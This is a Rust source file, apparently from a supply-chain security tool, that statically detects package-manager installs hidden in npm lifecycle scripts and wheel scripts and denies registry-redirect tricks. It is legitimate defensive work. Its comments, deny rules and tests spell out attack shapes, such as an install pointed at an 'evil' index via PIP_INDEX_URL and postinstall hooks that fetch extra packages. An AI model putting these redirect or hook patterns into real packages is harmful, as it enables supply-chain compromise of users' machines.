//! Static extraction of install references: package-manager invocations
//! inside a reviewed payload that resolve ANOTHER install on the victim
//! machine at install/build time (the TanStack `optionalDependencies →
//! github:orphan-commit → prepare` and Atomic Arch `npm install
//! atomic-lockfile` lane). Pure scanning of already-extracted bytes —
//! nothing here executes, fetches, or resolves anything.
//!
//! Best-effort by nature: obfuscated invocations (`\npm`, `env npm`,
//! indirection through variables the scanner cannot resolve) are layered
//! under the existing diff/PKGBUILD heuristic rules, not replaced by this
//! scanner. Everything the scanner CAN see statically, it must surface —
//! including invocations whose target is dynamic, which are disclosed as
//! unparseable references rather than skipped or guessed.

use std::path::Path;

use crate::registry::Ecosystem;
use crate::version::VersionInfo;

use crate::diff::Delta;
use crate::manifest::PackageJson;

const MAX_SCAN_LINE_BYTES: usize = 4096;

/// Flags that swallow the following token as their value; without this the
/// value would misread as a package spec (`npm install --registry
/// https://x evil` must yield exactly `evil`).
const CONSUME_VALUE_FLAGS: &[&str] = &[
    "-r",
    "--requirement",
    "-c",
    "--constraint",
    "-e",
    "--editable",
    "-t",
    "--target",
    "--prefix",
    "--registry",
    "--cache",
    "--tag",
    "--userconfig",
    "--globalconfig",
    "--proxy",
    "--https-proxy",
];

/// A package manager whose invocation was found inside a reviewed payload.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RefManager {
    Npm,
    Npx,
    Pnpm,
    Yarn,
    Bun,
    Bunx,
    Pip,
    Cargo,
    Yay,
    Paru,
}

impl RefManager {
    pub fn label(&self) -> &'static str {
        match self {
            RefManager::Npm => "npm",
            RefManager::Npx => "npx",
            RefManager::Pnpm => "pnpm",
            RefManager::Yarn => "yarn",
            RefManager::Bun => "bun",
            RefManager::Bunx => "bunx",
            RefManager::Pip => "pip",
            RefManager::Cargo => "cargo",
            RefManager::Yay => "yay",
            RefManager::Paru => "paru",
        }
    }

    /// Which registry an install through this manager resolves against:
    /// AUR helpers deliver through the AUR, cargo installs through
    /// crates.io, pip through PyPI, everything else through npm. Single
    /// source of truth for the gate and the recursive reviewer, so a new
    /// manager cannot silently land in the wrong ecosystem in one lane.
    pub fn ecosystem(self) -> Ecosystem {
        match self {
            RefManager::Pip => Ecosystem::PyPi,
            RefManager::Cargo => Ecosystem::Cargo,
            RefManager::Yay | RefManager::Paru => Ecosystem::Aur,
            _ => Ecosystem::Npm,
        }
    }
}

/// Where in the reviewed payload the reference was found.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RefOrigin {
    NpmLifecycle { script: String },
    Pkgbuild { function: String },
    WheelDataScript { path: String },
    CommandLine,
}

/// One machine-resolved install reference. `pinned` means the spec carries
/// an exact version; `parseable` is false when the spec is dynamic
/// (shell expansion, wildcards, metacharacters) or the invocation's target
/// could not be read at all (oversized line, unreadable file) — the
/// reference exists but its target cannot be resolved statically, which
/// downstream review treats as its own finding, never as a guess.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InstallRef {
    pub origin: RefOrigin,
    pub manager: RefManager,
    pub spec: String,
    pub pinned: bool,
    pub parseable: bool,
}

impl InstallRef {
    /// Registry-installable spec (`name`, `name@version`, `name==version`,
    /// scoped npm names). Anything else — git/URL specs, dynamic payloads —
    /// is surfaced but not recursively resolvable.
    pub fn registry_spec(&self) -> Option<(&str, Option<&str>)> {
        if !self.parseable || self.spec.is_empty() {
            return None;
        }
        let (name, version) = split_spec(self.manager, &self.spec)?;
        match self.manager {
            RefManager::Pip if valid_py_name(name) => Some((name, version)),
            RefManager::Pip => None,
            RefManager::Yay | RefManager::Paru if valid_aur_name(name) => Some((name, version)),
            RefManager::Yay | RefManager::Paru => None,
            _ if valid_npm_name(name) => Some((name, version)),
            _ => None,
        }
    }
}

/// Split `name==version` (pip) or `name@version` (npm-like) into parts.
/// A bare scoped name (`@scope/pkg`) is a name with no version; an empty
/// version part (`pkg@`, `requests==`) reads as unpinned, not broken.
fn split_spec(manager: RefManager, spec: &str) -> Option<(&str, Option<&str>)> {
    match manager {
        RefManager::Yay | RefManager::Paru => match spec.split_once('=') {
            Some((n, v)) if !n.is_empty() && !v.is_empty() => Some((n, Some(v))),
            Some(_) => Some((spec, None)),
            None => Some((spec, None)),
        },
        RefManager::Pip => match spec.split_once("==") {
            Some((n, v)) if !v.is_empty() => Some((n, Some(v))),
            Some((n, _)) => Some((n, None)),
            None => Some((spec, None)),
        },
        _ => match spec.rsplit_once('@') {
            Some((n, v)) if !n.is_empty() && !n.ends_with('@') && !v.is_empty() => {
                Some((n, Some(v)))
            }
            Some((n, _)) if !n.is_empty() => Some((n, None)),
            _ => Some((spec, None)),
        },
    }
}

fn valid_npm_name(name: &str) -> bool {
    if name.is_empty() || name.len() > 214 {
        return false;
    }
    let body = name.strip_prefix('@').unwrap_or(name);
    let Some((scope, pkg)) = body.split_once('/') else {
        return plain_npm_segment(name);
    };
    if name.strip_prefix('@').is_none() {
        return false;
    }
    plain_npm_segment(scope) && plain_npm_segment(pkg)
}

/// Mirrors the npm registry's own `is_valid_name_segment`: no leading `.`
/// or `_`, never `.` or `..`, lowercase letters/digits/`-`/`_`/`.` only.
/// A name this scanner accepts must be a name the registry would too, so
/// a crafted reference can never smuggle a path segment past review.
fn plain_npm_segment(seg: &str) -> bool {
    !seg.is_empty()
        && seg != "."
        && seg != ".."
        && !seg.starts_with('.')
        && !seg.starts_with('_')
        && seg
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '-' | '_' | '.'))
}

/// AUR pkgbase grammar: printable ASCII name characters, no separators.
fn valid_aur_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 255
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '-' | '@'))
}

fn valid_py_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 214
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
}

/// Shell syntax that makes the following token a dynamic payload rather
/// than a statically resolvable spec.
fn has_dynamic_syntax(token: &str) -> bool {
    token.chars().any(|c| {
        matches!(
            c,
            '$' | '`'
                | '('
                | ')'
                | '{'
                | '}'
                | '<'
                | '>'
                | '*'
                | '?'
                | '['
                | ']'
                | '~'
                | '"'
                | '\''
                | '\\'
                | '!'
        )
    })
}

fn version_is_exact(manager: RefManager, version: &str) -> bool {
    if version.is_empty() {
        return false;
    }
    match manager {
        RefManager::Pip => version.chars().next().is_some_and(|c| c.is_ascii_digit()),
        RefManager::Yay | RefManager::Paru => {
            crate::version::AurVersionInfo::parse(version).is_ok()
        }
        _ => semver::Version::parse(version).is_ok(),
    }
}

/// Build a reference from a raw spec token captured by a scanner. A spec
/// carrying dynamic shell syntax (or empty) is recorded unparseable —
/// disclosed downstream as its own finding, never guessed at.
pub fn raw_ref(origin: RefOrigin, manager: RefManager, spec: &str) -> InstallRef {
    if spec.is_empty() || has_dynamic_syntax(spec) {
        return InstallRef {
            origin,
            manager,
            spec: String::new(),
            pinned: false,
            parseable: false,
        };
    }
    let pinned = split_spec(manager, spec)
        .and_then(|(_, v)| v)
        .map(|v| version_is_exact(manager, v))
        .unwrap_or(false);
    InstallRef {
        origin,
        manager,
        spec: spec.to_string(),
        pinned,
        parseable: true,
    }
}

/// One whitespace-separated word, lowercased for matching and kept raw for
/// spec capture. Trailing `;`/`&`/`|` belong to shell grammar, not the
/// token: they end the command and are stripped from the word. A word that
/// is ONLY shell grammar (`&&`, `|`, `;`) is a separator.
struct Tok {
    lower: String,
    raw: String,
    ends_command: bool,
    is_separator: bool,
}

fn strip_token(word: &str) -> (String, bool, bool) {
    let core = word.trim_end_matches([';', '&', '|']);
    let ends_command = core.len() != word.len();
    let core = core.trim_end_matches(',').to_string();
    let is_separator = core.is_empty() && ends_command;
    (core, ends_command, is_separator)
}

/// Scan one line of shell-like text for package-manager invocations.
/// Matching is case-insensitive; specs are captured from the raw casing.
/// Returns (manager, spec) pairs; an empty spec string marks an invocation
/// whose target is dynamic/unparseable. Only invocations naming a target
/// are reported — a bare `npm install` resolves the manifest's own declared
/// dependencies, which the R04 dependency rules already review.
pub fn scan_line(line: &str) -> Vec<(RefManager, String)> {
    // Shell comments: everything from an unquoted `#` word is not part of
    // the command; scanning it only manufactures phantom references.
    let visible: String = line
        .split_whitespace()
        .take_while(|w| !w.starts_with('#'))
        .collect::<Vec<_>>()
        .join(" ");
    let line: &str = visible.as_str();
    let lower = line.to_lowercase();
    let lower_words: Vec<&str> = lower.split_whitespace().collect();
    let raw_words: Vec<&str> = line.split_whitespace().collect();
    // Lowercasing can change word count for exotic unicode; fall back to
    // lowercased specs rather than indexing raw words out of alignment.
    let toks: Vec<Tok> = lower_words
        .iter()
        .enumerate()
        .map(|(i, lw)| {
            let raw = if raw_words.len() == lower_words.len() {
                raw_words[i]
            } else {
                lw
            };
            let (lower, ends_command, is_separator) = strip_token(lw);
            let (raw, _, _) = strip_token(raw);
            Tok {
                lower,
                raw,
                ends_command,
                is_separator,
            }
        })
        .collect();
    scan_words(&toks)
}

fn scan_words(toks: &[Tok]) -> Vec<(RefManager, String)> {
    let mut refs = Vec::new();
    for i in 0..toks.len() {
        let Some(manager) = manager_from_token(&toks[i].lower) else {
            continue;
        };
        if toks[i].ends_command || toks[i].is_separator {
            continue;
        }
        // Global flags may sit between the manager and its verb
        // (`npm --no-fund install evil`): walk them off, capturing
        // package-naming flags, before looking for the verb.
        let mut package_flags: Vec<String> = Vec::new();
        let mut j = i + 1;
        let mut skip_value = false;
        let mut pending_package = false;
        while j < toks.len() {
            let t = &toks[j];
            if t.is_separator || t.ends_command {
                break;
            }
            if skip_value {
                skip_value = false;
                if pending_package {
                    pending_package = false;
                    package_flags.push(if has_dynamic_syntax(&t.raw) {
                        String::new()
                    } else {
                        t.raw.clone()
                    });
                }
                j += 1;
                continue;
            }
            if !t.lower.starts_with('-') {
                break;
            }
            let lower = t.lower.as_str();
            if matches!(
                manager,
                RefManager::Npx | RefManager::Bunx | RefManager::Npm
            ) {
                if let Some(value) = PACKAGE_NAMING_FLAGS
                    .iter()
                    .find_map(|f| lower.strip_prefix(&format!("{f}=")))
                {
                    // A dynamic target is disclosed as the empty-spec
                    // marker, never silently dropped behind a decoy.
                    package_flags.push(if has_dynamic_syntax(value) {
                        String::new()
                    } else {
                        value.to_string()
                    });
                    j += 1;
                    continue;
                }
                if PACKAGE_NAMING_FLAGS.contains(&lower) {
                    pending_package = true;
                    skip_value = true;
                    j += 1;
                    continue;
                }
            }
            if CONSUME_VALUE_FLAGS.contains(&lower) {
                skip_value = true;
            }
            j += 1;
        }
        // The verb may sit behind flags whose values are not enumerable
        // (`npm --loglevel warn install evil`): from the first non-flag
        // token, search to the next shell separator for a known verb.
        let mut exec_verb = false;
        let starts_command = match manager {
            // For npx/bunx the package IS the token after the flags — the
            // "verb" slot — so scanning starts there, not past it.
            RefManager::Npx | RefManager::Bunx => Some(j),
            _ => {
                let mut k = if matches!(manager, RefManager::Yay | RefManager::Paru) {
                    // Pacman-style managers spell the verb as a flag
                    // (`yay -S foo`): the flag walk above already consumed
                    // it, so search from the manager token itself, not
                    // from the first positional.
                    i
                } else {
                    j
                };
                let mut found = None;
                while k < toks.len() && !toks[k].is_separator && !toks[k].ends_command {
                    let word = toks[k].lower.as_str();
                    let is_verb = match manager {
                        RefManager::Npm => matches!(word, "install" | "i" | "add" | "exec" | "x"),
                        RefManager::Bun => matches!(word, "install" | "i" | "add" | "x"),
                        RefManager::Pnpm | RefManager::Yarn => {
                            matches!(word, "install" | "i" | "add" | "dlx")
                        }
                        RefManager::Pip => matches!(word, "install" | "i"),
                        RefManager::Cargo => matches!(word, "install"),
                        RefManager::Yay | RefManager::Paru => word.starts_with("-s"),
                        _ => false,
                    };
                    if is_verb {
                        exec_verb = matches!(word, "exec" | "x");
                        found = Some(k + 1);
                        break;
                    }
                    k += 1;
                }
                found
            }
        };
        let Some(start) = starts_command else {
            continue;
        };
        // When a --package flag already named the package, the remaining
        // tokens (for npx/bunx/npm exec) are the command to run, not more
        // packages.
        let named_by_flag = !package_flags.is_empty()
            && (matches!(manager, RefManager::Npx | RefManager::Bunx) || exec_verb);
        refs.extend(package_flags.into_iter().map(|s| (manager, s)));
        if named_by_flag {
            continue;
        }
        // npx/bunx run ONE package; the remaining tokens are its args.
        let take_all = !matches!(manager, RefManager::Npx | RefManager::Bunx);
        let mut specs = positionals(&toks[start..], manager, take_all);
        if take_all {
            refs.extend(specs.drain(..).map(|s| (manager, s)));
        } else if let Some(s) = specs.into_iter().next() {
            refs.push((manager, s));
        }
    }
    refs
}

/// Resolve a (lowercased) command word to its package manager, matching
/// the basename so absolute paths (`/usr/bin/npm`), quoted paths
/// (`"/usr/bin/npm"`), and backslash-escaped tokens (`\npm`, Windows
/// `C:\tools\npm`) cannot dodge the scanner. A bare `npm install` and an
/// absolute-path `npm install` run the same binary; the review must see
/// both. Returns `None` for anything that is not a manager invocation.
fn manager_from_token(word: &str) -> Option<RefManager> {
    let bare = word
        .trim_start_matches(['\\', '"', '\'', '`', '$', '(', '{'])
        .trim_end_matches(['"', '\'', '`', ')', '}', ';', ',']);
    let base = bare.rsplit(['/', '\\']).next().unwrap_or(bare);
    match base {
        "npm" => Some(RefManager::Npm),
        "npx" => Some(RefManager::Npx),
        "pnpm" => Some(RefManager::Pnpm),
        "yarn" => Some(RefManager::Yarn),
        "bun" => Some(RefManager::Bun),
        "bunx" => Some(RefManager::Bunx),
        "pip" | "pip3" => Some(RefManager::Pip),
        "cargo" => Some(RefManager::Cargo),
        "yay" => Some(RefManager::Yay),
        "paru" => Some(RefManager::Paru),
        _ => None,
    }
}

/// True when the word is an inline environment assignment that can redirect
/// a package manager away from its default registry: `NPM_CONFIG_*`,
/// `PIP_*`, or `CARGO_*` (matched case-insensitively; the scanner already
/// lowercases). `PIP_INDEX_URL=https://evil pip install requests` would be
/// reviewed against PyPI while installing from the attacker's index.
fn is_redirect_env_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    let name = name.trim_start_matches(['\\', '"', '\'', '`']);
    name.starts_with("npm_config_") || name.starts_with("pip_") || name.starts_with("cargo_")
}

/// True when a process-environment variable NAME can redirect installs at
/// runtime (same families as the inline assignments). Names only — values
/// are never inspected or stored.
pub fn is_redirect_env_name(name: &str) -> bool {
    let lower = name.to_lowercase();
    lower.starts_with("npm_config_") || lower.starts_with("pip_") || lower.starts_with("cargo_")
}

/// The redirect-capable variables present in the given environment names.
/// The gate feeds this `std::env` at gate time so an exported redirect is
/// disclosed even though it never appears in the gated command line.
pub fn redirect_env_present<'a>(names: impl Iterator<Item = &'a str>) -> Vec<String> {
    let mut hits: Vec<String> = names
        .filter(|n| is_redirect_env_name(n))
        .map(|n| n.to_string())
        .collect();
    hits.sort();
    hits.dedup();
    hits
}

/// Positional package specs after a manager verb. `take_all` collects
/// every spec an install-style verb names (`npm install a b`); otherwise
/// only the first is taken. Token handling: flags are skipped (value-
/// consuming flags also skip their value), a shell separator or
/// command-ending token ends the scan, a dynamic token yields the
/// empty-string marker, a plausible package spec is captured, and
/// flag-value noise that is neither dynamic nor a plausible spec is
/// dropped.
/// npx/npm-exec style flags that NAME the package to run.
const PACKAGE_NAMING_FLAGS: [&str; 2] = ["--package", "-p"];

fn positionals(toks: &[Tok], manager: RefManager, take_all: bool) -> Vec<String> {
    let mut specs = Vec::new();
    let mut skip_value = false;
    let mut pending_package = false;
    let mut saw_package_flag = false;
    for t in toks {
        if skip_value {
            skip_value = false;
            continue;
        }
        if t.is_separator {
            break;
        }
        if t.lower.is_empty() {
            continue;
        }
        if pending_package {
            pending_package = false;
            // `npx --package <pkg>` names the package with a space; capture
            // it rather than swallowing it as a flag value. Once a package
            // is named by flag, later positionals are the COMMAND to run,
            // not more packages.
            saw_package_flag = true;
            if !has_dynamic_syntax(&t.raw) {
                specs.push(t.raw.clone());
                if !take_all {
                    break;
                }
            }
            continue;
        }
        if t.lower.starts_with('-') {
            if matches!(
                manager,
                RefManager::Npx | RefManager::Bunx | RefManager::Npm
            ) {
                let lower = t.lower.as_str();
                if let Some(value) = PACKAGE_NAMING_FLAGS
                    .iter()
                    .find_map(|f| lower.strip_prefix(&format!("{f}=")))
                {
                    saw_package_flag = true;
                    specs.push(value.to_string());
                    if !take_all {
                        break;
                    }
                    continue;
                }
                if PACKAGE_NAMING_FLAGS.contains(&lower) {
                    pending_package = true;
                    continue;
                }
            }
            if CONSUME_VALUE_FLAGS.contains(&t.lower.as_str()) {
                skip_value = true;
            }
        } else if has_dynamic_syntax(&t.raw) {
            // One unparseable marker per invocation, even when the hostile
            // line carries several dynamic tokens back to back.
            if specs.last().map(String::is_empty) != Some(true) {
                specs.push(String::new());
            }
        } else if non_registry_spec(&t.raw) {
            // git:/URL/path specs are real references (the TanStack lane):
            // captured so the review can disclose them as unresolvable to
            // any registry, never silently dropped as flag-value noise.
            specs.push(t.raw.clone());
        } else if saw_package_flag {
            // Positionals after a named package are the command's args.
            break;
        } else if plausible_spec(manager, &t.raw) {
            specs.push(t.raw.clone());
        }
        if specs.len() == if take_all { usize::MAX } else { 1 } || t.ends_command {
            break;
        }
    }
    specs
}

fn plausible_spec(manager: RefManager, token: &str) -> bool {
    let name = split_spec(manager, token).map(|(n, _)| n).unwrap_or(token);
    match manager {
        RefManager::Pip => valid_py_name(name),
        _ => valid_npm_name(name),
    }
}

/// A parseable token that names a NON-registry source: git specs, URLs,
/// local paths, tarballs. These are real install references whose payload
/// no registry can vouch for.
fn non_registry_spec(token: &str) -> bool {
    token.contains("://")
        || token.starts_with("git+")
        || token.starts_with("git@")
        || token.starts_with("github:")
        || token.starts_with("gitlab:")
        || token.starts_with("bitbucket:")
        || token.starts_with("./")
        || token.starts_with("../")
        || token.starts_with('/')
        || token.ends_with(".tgz")
        || token.ends_with(".tar.gz")
}

/// Install references inside an npm package's lifecycle scripts. Only the
/// scripts that run during a plain `npm install` are scanned — a reference
/// in `test` or `lint` never executes on the install line. An oversized
/// line is disclosed as an unparseable reference, never skipped silently.
/// Shell continuations (`\` + newline) are joined first so a split
/// invocation (`npm \` + newline + `install evil`) scans as the one logical
/// command the shell would run.
pub fn from_npm_lifecycle(manifest: &PackageJson) -> Vec<InstallRef> {
    let mut refs = Vec::new();
    for script_name in manifest.lifecycle_scripts() {
        let Some(body) = manifest.scripts.get(&script_name) else {
            continue;
        };
        for line in join_continuations(body).lines() {
            let origin = RefOrigin::NpmLifecycle {
                script: script_name.clone(),
            };
            refs.extend(scan_text_line(line, &origin));
        }
    }
    refs
}

/// Install references inside wheel `.data/scripts` payloads, which ship
/// onto PATH and run with the user's privileges. Scan is delta-driven and
/// bounded: only files listed in the delta under a `.data/scripts/`
/// directory. A script that cannot be read as UTF-8 is disclosed as an
/// unparseable reference rather than silently skipped. Shell continuations
/// are joined before scanning, mirroring the npm lifecycle lane.
pub fn from_wheel_data_scripts(root: &Path, delta: &Delta) -> Vec<InstallRef> {
    let mut refs = Vec::new();
    let changed = delta
        .files_added
        .iter()
        .chain(delta.files_modified.iter())
        .filter(|f| f.relative_path.contains(".data/scripts/"));
    for change in changed {
        let path = change.relative_path.clone();
        let origin = RefOrigin::WheelDataScript { path: path.clone() };
        let text = match std::fs::read_to_string(root.join(&path)) {
            Ok(t) => t,
            Err(_) => {
                refs.push(raw_ref(origin, RefManager::Pip, ""));
                continue;
            }
        };
        for line in join_continuations(&text).lines() {
            refs.extend(scan_text_line(line, &origin));
        }
    }
    refs
}

/// Join shell line continuations so a manager invocation split across
/// physical lines scans as the single logical command the shell runs.
/// CRLF is folded first so a Windows-style continuation joins too.
fn join_continuations(text: &str) -> String {
    text.replace("\\\r\n", "").replace("\\\n", "")
}

fn scan_text_line(line: &str, origin: &RefOrigin) -> Vec<InstallRef> {
    if line.len() > MAX_SCAN_LINE_BYTES {
        // The invocation surface exists but cannot be scanned safely;
        // disclose it as unparseable instead of scanning blind or
        // skipping silently.
        return vec![raw_ref(origin.clone(), RefManager::Npm, "")];
    }
    scan_line(line)
        .into_iter()
        .map(|(manager, spec)| raw_ref(origin.clone(), manager, &spec))
        .collect()
}

/// Shapes the token scanner cannot safely resolve, surfaced for the hook
/// gate to deny: pip flags that name or redirect non-registry sources,
/// inline environment assignments (`NPM_CONFIG_*`, `PIP_*`, `CARGO_*`) and
/// `.npmrc` references that would install from elsewhere than the reviewed
/// registry, and manager tokens hidden inside quotes or shell escapes.
/// Best-effort obfuscation (obase64'd scripts, indirect exec) is NOT caught
/// here — the gate's doc says so.
pub fn gate_hard_denies(line: &str) -> Vec<String> {
    let mut denies = npm_registry_override_shape(line);
    if let Some(detail) = pip_non_registry_shape(line) {
        denies.push(detail);
    }
    denies.extend(env_redirect_shape(line));
    let lower_words: Vec<String> = line
        .to_lowercase()
        .split_whitespace()
        .map(|w| w.to_string())
        .collect();
    const MANAGERS: [&str; 11] = [
        "npm", "npx", "pnpm", "yarn", "bun", "bunx", "pip", "pip3", "cargo", "yay", "paru",
    ];
    for word in &lower_words {
        let bare = word
            .trim_start_matches(['\\', '"', '\'', '`', '$', '(', '{'])
            .trim_end_matches(['"', '\'', '`', ')', '}', ';', ',']);
        // Basename match, mirroring `manager_from_token`: a quoted or
        // escaped absolute path (`"/usr/bin/npm"`, `\npm`) hides the same
        // token a bare `npm` names. A plain absolute path (`/usr/bin/npm`)
        // is not hidden — it scans through `manager_from_token` — so only
        // words carrying quoting/escape/substitution syntax deny here.
        let base = bare.rsplit(['/', '\\']).next().unwrap_or(bare);
        if bare != word.as_str() && MANAGERS.contains(&base) {
            denies.push(format!(
                "package manager token hidden behind quoting, an escape, or substitution: `{word}`"
            ));
        }
    }
    denies
}

/// Inline environment assignments that redirect the install away from the
/// reviewed registry (`PIP_INDEX_URL=https://evil pip install requests`,
/// `NPM_CONFIG_REGISTRY=... npm install y`, `CARGO_REGISTRIES_... cargo
/// install foo`) plus `.npmrc` references, which silently re-point npm at
/// another registry. Denied outright: the review would vouch for bytes the
/// install never fetches.
fn env_redirect_shape(line: &str) -> Vec<String> {
    let lower = line.to_lowercase();
    let words: Vec<&str> = lower.split_whitespace().collect();
    let has_manager = words.iter().any(|w| manager_from_token(w).is_some());
    if !has_manager {
        return Vec::new();
    }
    let mut denies = Vec::new();
    for word in &words {
        if !is_redirect_env_assignment(word) {
            continue;
        }
        let name = word
            .split_once('=')
            .map(|(name, _)| name.trim_start_matches(['\\', '"', '\'', '`']))
            .unwrap_or("");
        if name.starts_with("npm_config_") {
            denies.push(
                "npm_config_* environment assignment can override registry and auth config"
                    .to_string(),
            );
            break;
        }
        if name.starts_with("pip_") {
            denies.push(
                "PIP_* environment assignment (PIP_INDEX_URL, PIP_EXTRA_INDEX_URL, \
                 PIP_CONFIG_FILE, ...) can redirect the package index away from the \
                 reviewed registry"
                    .to_string(),
            );
            break;
        }
        if name.starts_with("cargo_") {
            denies.push(
                "CARGO_* environment assignment can redirect registry sources away from \
                 the reviewed index"
                    .to_string(),
            );
            break;
        }
    }
    if words.iter().any(|w| w.contains(".npmrc")) {
        denies.push(
            "command references an .npmrc file, which can redirect the registry for \
             the installs that follow"
                .to_string(),
        );
    }
    denies
}

/// A gated install whose npm registry/auth config is overridden would be
/// reviewed against npmjs while the install pulls from somewhere else —
/// deny the override outright (mirrors the pip --index-url denial).
fn npm_registry_override_shape(line: &str) -> Vec<String> {
    const OVERRIDES: [&str; 7] = [
        "--registry",
        "--userconfig",
        "--globalconfig",
        "--proxy",
        "--https-proxy",
        "--cache",
        "--tag",
    ];
    let lower = line.to_lowercase();
    let words: Vec<&str> = lower.split_whitespace().collect();
    let has_manager = words.iter().any(|w| {
        manager_from_token(w).is_some_and(|m| {
            matches!(
                m,
                RefManager::Npm
                    | RefManager::Npx
                    | RefManager::Pnpm
                    | RefManager::Yarn
                    | RefManager::Bun
                    | RefManager::Bunx
            )
        })
    });
    if !has_manager {
        return Vec::new();
    }
    let has_npm_install = words
        .iter()
        .any(|w| matches!(*w, "install" | "i" | "add" | "exec" | "x" | "dlx"));
    let mut denies = Vec::new();
    // `npm config set registry ...` redirects every future install.
    if words.contains(&"config") && words.contains(&"set") {
        denies.push(
            "npm config set can redirect the registry for the installs that follow".to_string(),
        );
    }
    for word in &words {
        if !has_npm_install {
            continue;
        }
        for flag in OVERRIDES {
            if *word == flag || word.starts_with(&format!("{flag}=")) {
                denies.push(format!(
                    "npm {flag} override would review one registry and install from another"
                ));
                break;
            }
        }
    }
    denies
}

fn pip_non_registry_shape(line: &str) -> Option<String> {
    const DANGEROUS: [&str; 8] = [
        "-r",
        "--requirement",
        "-e",
        "--editable",
        "-c",
        "--constraint",
        "--index-url",
        "--extra-index-url",
    ];
    let lower = line.to_lowercase();
    let words: Vec<&str> = lower.split_whitespace().collect();
    for i in 0..words.len() {
        if manager_from_token(words[i]) != Some(RefManager::Pip) {
            continue;
        }
        // Anywhere after `pip install`, any dangerous flag is a hard deny —
        // flags between install and the danger, or after a package name,
        // must not dilute the signal. The manager token at `i` is inert
        // here (never `install` nor dangerous), so scanning from it is
        // the same verdict without index arithmetic.
        let mut in_install = false;
        for word in &words[i..] {
            if *word == "install" || *word == "i" {
                in_install = true;
                continue;
            }
            if in_install && DANGEROUS.contains(word) {
                return Some(format!(
                    "pip {word} names or redirects non-registry sources"
                ));
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    use crate::manifest::PackageJson;
    use std::collections::BTreeMap;

    fn manifest_with(script: &str, body: &str) -> PackageJson {
        let mut scripts = BTreeMap::new();
        scripts.insert(script.to_string(), body.to_string());
        PackageJson {
            name: "pkg".into(),
            version: "1.0.0".into(),
            scripts,
            ..Default::default()
        }
    }

    fn npm_refs(script: &str, body: &str) -> Vec<InstallRef> {
        from_npm_lifecycle(&manifest_with(script, body))
    }

    #[test]
    fn lifecycle_postinstall_npm_install_captures_spec() {
        let refs = npm_refs(
            "postinstall",
            "node scripts/setup.js && npm install atomic-lockfile",
        );
        assert_eq!(refs.len(), 1);
        let r = &refs[0];
        assert_eq!(r.spec, "atomic-lockfile");
        assert_eq!(r.manager, RefManager::Npm);
        assert!(!r.pinned);
        assert!(r.parseable);
        assert_eq!(
            r.origin,
            RefOrigin::NpmLifecycle {
                script: "postinstall".into()
            }
        );
    }

    #[test]
    fn lifecycle_pinned_scoped_spec() {
        let refs = npm_refs("preinstall", "npm install @scope/pkg@1.2.3 --save");
        assert_eq!(refs.len(), 1);
        let r = &refs[0];
        assert_eq!(r.spec, "@scope/pkg@1.2.3");
        assert!(r.pinned);
        assert_eq!(r.registry_spec(), Some(("@scope/pkg", Some("1.2.3"))));
    }

    #[test]
    fn lifecycle_flags_before_spec_are_skipped() {
        let refs = npm_refs("postinstall", "npm install --save-exact left-pad@1.0.0");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "left-pad@1.0.0");
        assert!(refs[0].pinned);
    }

    #[test]
    fn lifecycle_value_flags_swallow_their_argument() {
        let refs = npm_refs(
            "postinstall",
            "npm install --registry https://registry.npmjs.org evil-pkg",
        );
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "evil-pkg");
    }

    #[test]
    fn lifecycle_every_named_spec_is_captured() {
        let refs = npm_refs("postinstall", "npm install atomic-lockfile minimist chalk");
        assert_eq!(refs.len(), 3);
        let specs: Vec<_> = refs.iter().map(|r| r.spec.as_str()).collect();
        assert_eq!(specs, ["atomic-lockfile", "minimist", "chalk"]);
    }

    #[test]
    fn lifecycle_npx_and_bunx() {
        let refs = npm_refs("prepare", "npx cypress@13.0.0 install && bunx esbuild");
        assert_eq!(refs.len(), 2);
        assert_eq!(refs[0].manager, RefManager::Npx);
        assert_eq!(refs[0].spec, "cypress@13.0.0");
        assert_eq!(refs[1].manager, RefManager::Bunx);
        assert_eq!(refs[1].spec, "esbuild");
    }

    #[test]
    fn lifecycle_npx_takes_only_first_positional() {
        let refs = npm_refs("postinstall", "npx cypress install --force");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "cypress");
    }

    #[test]
    fn lifecycle_bun_install_and_yarn_add() {
        let refs = npm_refs("install", "bun install js-digest; yarn add lockfile-js");
        assert_eq!(refs.len(), 2);
        assert_eq!(refs[0].manager, RefManager::Bun);
        assert_eq!(refs[0].spec, "js-digest");
        assert_eq!(refs[1].manager, RefManager::Yarn);
        assert_eq!(refs[1].spec, "lockfile-js");
    }

    #[test]
    fn lifecycle_dynamic_spec_is_unparseable_not_guessed() {
        let refs = npm_refs("postinstall", "npm install $(cat deps.txt)");
        assert_eq!(refs.len(), 1);
        let r = &refs[0];
        assert_eq!(r.spec, "");
        assert!(!r.parseable);
        assert!(r.registry_spec().is_none());
    }

    #[test]
    fn lifecycle_bare_install_is_not_an_external_ref() {
        assert!(npm_refs("postinstall", "npm install --production").is_empty());
        assert!(npm_refs("install", "node-gyp rebuild").is_empty());
    }

    #[test]
    fn lifecycle_install_stops_at_shell_separator() {
        assert!(npm_refs("postinstall", "npm install && echo done").is_empty());
        assert!(npm_refs("postinstall", "npm install; exit 0").is_empty());
    }

    #[test]
    fn non_lifecycle_scripts_are_ignored() {
        assert!(npm_refs("test", "npm install something").is_empty());
        assert!(npm_refs("lint", "npx eslint .").is_empty());
    }

    #[test]
    fn lifecycle_invocation_is_case_insensitive() {
        let refs = npm_refs("postinstall", "NPM Install atomic-lockfile");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].spec, "atomic-lockfile");
    }

    #[test]
    fn lifecycle_oversized_line_is_disclosed_unparseable() {
        let padded = format!("{} && npm install evil", "x".repeat(4200));
        let refs = npm_refs("postinstall", &format!("npm install ok\n{padded}"));
        assert_eq!(refs.len(), 2);
        assert_eq!(refs[0].spec, "ok");
